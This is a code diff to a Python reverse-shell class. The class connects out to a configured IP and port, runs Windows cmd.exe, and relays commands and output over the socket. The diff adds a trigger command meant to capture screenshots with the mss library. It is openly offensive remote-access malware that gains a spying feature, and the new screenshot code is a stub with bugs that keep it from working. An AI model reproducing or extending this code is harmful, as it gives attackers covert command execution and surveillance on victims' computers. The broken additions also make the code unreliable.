@@ -1,3 +1,4 @@
+from mss import mss 
 import socket
 import subprocess
 import threading
@@ -13,19 +14,25 @@ class Shell:
         shell.connect((self.ip,self.port))
 
         self.start(shell)
-
-        
-
+    
+    # method for handling incoming commands
     def s2p(self, socket, process):
         while True:
             data = socket.recv(1024)
-            if len(data) > 0:
+            if len(data) > 0 and str(data) != "shelly_pic":
                 process.stdin.write(data)
                 process.stdin.flush()
+            elif str(data) == "shelly_pic":
+                self.screenshot()
 
+    # sending stdout back to server
     def p2s(self, socket, process):
         while True:
             socket.send(process.stdout.read(1))
+
+    # take screenshots, and send them
+    def screenshot():
+        pass
     
     def start(self, socket): 
         process=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
